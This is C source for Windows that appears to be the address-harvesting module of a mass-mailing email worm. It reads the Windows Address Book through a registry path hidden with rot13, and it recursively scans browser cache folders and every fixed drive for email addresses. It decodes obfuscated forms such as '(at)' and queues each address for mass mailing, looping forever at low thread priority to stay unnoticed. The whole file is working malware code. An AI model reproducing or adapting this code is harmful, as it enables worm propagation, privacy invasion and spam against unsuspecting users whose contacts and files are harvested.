
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "massmail.h"
#include "scan.h"
#include "lib.h"

int volatile scan_freezed;

static void scan_out(const char *email)
{
	massmail_addq(email, 0);
	return;
}

//-----------------------------------------------------------------------------

static int scantext_textcvt(unsigned char *buf, int len)
{
	static const unsigned char charcvt_tab[256] = {
          /*00*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
          /*10*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
          /*20*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*30*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*40*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*50*/ 0,0,0,0,0,0,0,0,0,0,0,'(',0,')',0,0,   /* "[]" -> "()" */
          /*60*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*70*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*80*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*90*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*A0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*B0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*C0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*D0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*E0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*F0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32
	};

	static const struct {
		int in_len;
		char *in;
		int out_len;		/* MUST BE <= in_len */
		char *out;
	} cvt_tab[] = {

		{ 2, "  ", 1, " " },
		{ 2, "@ ", 1, "@" },
		{ 2, " @", 1, "@" },
		{ 2, "@@", 1, "@" },

/*		{ 2, "( ", 1, "(" },
 *		{ 2, " )", 1, ")" },
 *		{ 2, "< ", 1, "<" },
 *		{ 2, " >", 1, ">" },
 *		{ 3, "</ ", 2, "</" },
 *		{ 3, " />", 2, "/>" },
 */
		{ 3, "(@)", 1, "@" },
/*		{ 3, "<@>", 1, "@" },
 *		{ 3, ".@.", 1, "@" },
 *		{ 4, ".at.", 1, "@" },
 */

		{ 4, "(at)", 1, "@" },
/*		{ 4, "_at_", 1, "@" },
 *		{ 4, "@at@", 1, "@" },
 *		{ 4, "\'at\'", 1, "@" },
 *		{ 4, "\"at\"", 1, "@" },
 *		{ 8, "(atsign)", 1, "@" },
 *		{ 9, "(at_sign)", 1, "@" },
 *		{ 9, "(at-sign)", 1, "@" },
 *		{ 9, "(at sign)", 1, "@" },
 *		{ 4, "&lt;", 1, "<" },
 *		{ 4, "&gt;", 1, "<" },
 */
		{ 6, "&nbsp;", 1, " " },
		{ 5, "&nbsp", 1, " " },

/*		{ 6, "&quot;", 1, "\"" },
 *		{ 5, "&amp;", 1, "&" },
 *		{ 4, "<br>", 1, " " },
 *		{ 5, "<br/>", 1, " " },
 *		{ 8, "<strong>", 1, " " },
 *		{ 9, "</strong>", 1, " " },
 */
		{ 0, NULL, 0, NULL }
	};

	register int i, matches;
	register unsigned char *p, c;

	for (i=len, p=buf; i>0; i--, p++)
		if ((c = charcvt_tab[*p]) != 0) *p = c;

retry_2nd:
	for (i=0, matches=0; i<=len; i++) {
		register int j, k, l;
		for (j=0; (l = cvt_tab[j].in_len) != 0; j++) {
			if (l > i) continue;
			if (xmemcmpi(cvt_tab[j].in, buf + i - l, l) != 0) continue;
			matches++;
			i -= l;
			memcpy(buf+i, cvt_tab[j].out, cvt_tab[j].out_len);
			if (l != cvt_tab[j].out_len) {
				//---memcpy(buf+i+cvt_tab[j].out_size, buf+i+l, len-i-l);---
				register unsigned char *q;
				for (p=(buf+i+cvt_tab[j].out_len), q=(buf+i+l), k=(len-i-l); k>0; k--)
					*p++ = *q++;
			}
			len = len - l + cvt_tab[j].out_len;
		}
	}
	buf[len] = 0;
	matches += html_replace(buf);
	matches += html_replace2(buf);
	if (matches != 0) goto retry_2nd;
	return 0;
}

int scantext_extract_ats(unsigned char *buf, int len)
{
	/* alphanumeric and "-_.@!$"; 1=valid e-mail char, 2=invalid only at start/end */
	static const unsigned char mail_chars[256] = {
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,2,0,0,0,0,0,0,0,0,0,0,0,2,2,0,
		1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,
		2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
		1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,2,
		0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
		1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
	};
	struct maillist_t *root, *top;
	int i, j, st_i, end_i, mail_len;
	int found;
	char out_buf[256];

	root = top = NULL;
	for (i=0,found=0; i<len; i++) {
		if (buf[i] != '@') continue;

		for (st_i=i; st_i>0; st_i--)
			if (mail_chars[buf[st_i-1]] == 0) break;
		for (end_i=i+1; end_i<len; end_i++)
			if (mail_chars[buf[end_i]] == 0) break;

		for (; st_i<end_i; st_i++)
			if (mail_chars[buf[st_i]] != 2) break;
		if (((st_i+3) >= end_i) || (st_i >= i)) continue;
		for (; end_i > st_i; end_i--)
			if (mail_chars[buf[end_i-1]] != 2) break;
		if ((end_i <= (st_i+3)) || (end_i <= i)) continue;

		mail_len = end_i - st_i;
		if (mail_len < 7) continue;	/* x@xx.xx */

		found++;
		for (j=0; (j < (sizeof(out_buf)-2)) && (j < mail_len); j++)
			out_buf[j] = buf[st_i+j];
		out_buf[j] = 0;
		scan_out(out_buf);
	}

	return found;
}

int scan_textfile(const char *filename)
{
	HANDLE hFile;
	DWORD dwRead, dwTotalRead, dwTotalFound;
	char buf[65535];

	hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) return 1;

	dwTotalRead = 0;
	dwTotalFound = 0;
	for (;;) {
		dwRead = 0;
		ReadFile(hFile, buf, sizeof(buf)-2, &dwRead, NULL);
		if (dwRead == 0 || dwRead >= sizeof(buf)) break;
		dwTotalRead += dwRead;
		buf[dwRead] = 0;

		scantext_textcvt(buf, dwRead);
		dwTotalFound += scantext_extract_ats(buf, dwRead);

		if ((dwTotalFound == 0) && (dwTotalRead > (300*1024)))
			break;
	}
	CloseHandle(hFile);
	return 0;
}

//-----------------------------------------------------------------------------
// Recursive directory scanner

static int scan_wab(const char *);

static void scan_dir_file(const char *path, WIN32_FIND_DATA *fd)
{
	char file_ext[16];
	int i, j;
	DWORD size_lim;

	if (fd->nFileSizeLow < 40) return;

	for (i=0,j=-1; fd->cFileName[i] && (i < 255); i++)
		if (fd->cFileName[i] == '.') j=i;

	if (j < 0) {
		file_ext[0] = 0;
	} else {
		lstrcpyn(file_ext, fd->cFileName+j+1, sizeof(file_ext)-1);
		CharLower(file_ext);
	}

	do {
		size_lim = 200 * 1024;

		i = 0;				/* stop */
		if (file_ext[0] == 0)
			if (fd->nFileSizeLow > (20*1024)) break;

		i = 1;				/* parse as text file */
		if (lstrcmp(file_ext, "txt") == 0) {size_lim=80*1024; break; }
		if (xstrncmp(file_ext, "htmb", 3) == 0) break;
		if (xstrncmp(file_ext, "shtl", 3) == 0) break;
		if (xstrncmp(file_ext, "jspl", 3) == 0) break;
		if (xstrncmp(file_ext, "cgil", 3) == 0) break;
		if (xstrncmp(file_ext, "xmls", 3) == 0) break;
		if (xstrncmp(file_ext, "phpq", 3) == 0) break;
		if (xstrncmp(file_ext, "aspd", 3) == 0) break;
		if (xstrncmp(file_ext, "dbxn", 3) == 0) break;
		if (xstrncmp(file_ext, "tbbg", 3) == 0) { size_lim=1200*1024; break; }
		if (xstrncmp(file_ext, "adbh", 3) == 0) break;
		if (lstrcmp(file_ext, "pl") == 0) break;
		if (lstrcmp(file_ext, "html") == 0) break;
		if (lstrcmp(file_ext, "php") == 0) break;

		i = 2;				/* parse as WAB */
		if (xstrncmp(file_ext, "wab", 3) == 0) { size_lim=8*1024*1024; break; }

		i = 0;
		return;
	} while (0);

	if (fd->nFileSizeLow > size_lim) return;

	while (scan_freezed) Sleep(2048);

	if (i == 1) {
		scan_textfile(path);
	} else if (i == 2) {
		scan_wab(path);
	}
}

static int scan_dir1(const char *path, int max_level)
{
	WIN32_FIND_DATA fd;
	HANDLE hFind;
	char buf[MAX_PATH+20];

	if ((max_level <= 0) || (path == NULL)) return 1;
	if (path[0] == 0) return 1;

	while (scan_freezed) Sleep(2048);

	lstrcpy(buf, path);
	if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
	lstrcat(buf, "*.*");

	memset(&fd, 0, sizeof(fd));
	for (hFind=NULL;;) {
		if (hFind == NULL) {
			hFind = FindFirstFile(buf, &fd);
			if (hFind == INVALID_HANDLE_VALUE) hFind = NULL;
			if (hFind == NULL) break;
		} else {
			if (FindNextFile(hFind, &fd) == 0) break;
		}

		if (fd.cFileName[0] == '.') {
			if (fd.cFileName[1] == 0) continue;
			if (fd.cFileName[1] == '.')
				if (fd.cFileName[2] == 0) continue;
		}

		lstrcpy(buf, path);
		if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
		lstrcat(buf, fd.cFileName);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {
			Sleep(75);
			scan_dir1(buf, max_level-1);
		} else {
			scan_dir_file(buf, &fd);
		}
	}
	if (hFind != NULL) FindClose(hFind);
	return 0;
}

//-----------------------------------------------------------------------------
// .wab scanner

static int scan_wab(const char *filename)
{
	HANDLE hFile, hMap;
	DWORD cnt, base1, maxsize, i;
	register DWORD b, j;
	unsigned char *ptr;
	char email[128];

	hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) return 1;
	maxsize = GetFileSize(hFile, NULL);

	hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if (hMap == NULL || hMap == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return 2;
	}

	ptr = (unsigned char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
	if (ptr == NULL) {
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 3;
	}

	base1 = *((DWORD *)(ptr + 0x60));
	cnt = *((DWORD *)(ptr + 0x64));

	for (i=0; i<cnt; i++) {
		b = base1 + i * 68;
		memset(email, '\0', sizeof(email));
		for (j=0; (b < maxsize) && (j < 68); j++, b+=2) {
			email[j] = ptr[b];
			if (ptr[b] == 0) break;
		}
		if (j > 0)
			scan_out(email);
	}

	UnmapViewOfFile(ptr);
	CloseHandle(hMap);
	CloseHandle(hFile);
	return 0;
}

static void scan_default_wab()
{
	HKEY k;
	DWORD dw;
	char key_path[80], wabpath[256];

	/* "Software\\Microsoft\\WAB\\WAB4\\Wab File Name" */
	rot13(key_path, "Fbsgjner\\Zvpebfbsg\\JNO\\JNO4\\Jno Svyr Anzr");
	if (RegOpenKeyEx(HKEY_CURRENT_USER, key_path, 0, KEY_READ, &k) != 0)
		return;
	memset(wabpath, '\0', sizeof(wabpath));
	dw = sizeof(wabpath);
	RegQueryValueEx(k, NULL, NULL, NULL, wabpath, &dw);
	RegCloseKey(k);
	if (wabpath[0] != 0)
		scan_wab(wabpath);
}

//-----------------------------------------------------------------------------

void scan_ietemp()
{
	char buf[MAX_PATH+128];
	char sz_ls[64], sz_tif[64];
	int i;

	rot13(sz_tif, "Grzcbenel Vagrearg Svyrf");  /* "Temporary Internet Files" */
	rot13(sz_ls, "Ybpny Frggvatf");             /* "Local Settings" */

	for (i=0; i<2; i++) {
		memset(buf, 0, sizeof(buf));
		if (i == 0)
			GetWindowsDirectory(buf, sizeof(buf));
		else
			GetEnvironmentVariable("USERPROFILE", buf, sizeof(buf));
		if (buf[0] == 0) continue;
		if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
		if (i == 1) {
			lstrcat(buf, sz_ls);
			lstrcat(buf, "\\");
		}
		lstrcat(buf, sz_tif);
		scan_dir1(buf, 5);
	}
}

void scan_disks()
{
	char buf[MAX_PATH], sysdisk;

	memset(buf, 0, sizeof(buf));
	GetSystemDirectory(buf, sizeof(buf));
	sysdisk = buf[0];

	lstrcpy(buf+1, ":\\");
	scan_dir1(buf, 15);

	for (buf[0]='C'; buf[0]<'Z'; buf[0]++) {
		if (buf[0] == sysdisk) continue;
		switch (GetDriveType(buf)) {
			case DRIVE_FIXED:
			case DRIVE_RAMDISK:
				break;
			default:
				continue;
		}
		Sleep(8096);
		scan_dir1(buf, 15);
	}
}

//-----------------------------------------------------------------------------

void scan_init()
{
	scan_freezed = 0;
	return;
}

void scan_freeze(int do_freeze)
{
	scan_freezed = do_freeze;
}

void scan_main()
{
	scan_default_wab();

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
	scan_ietemp();

	for (;;) {
		scan_disks();
		Sleep(32768);
	}
}
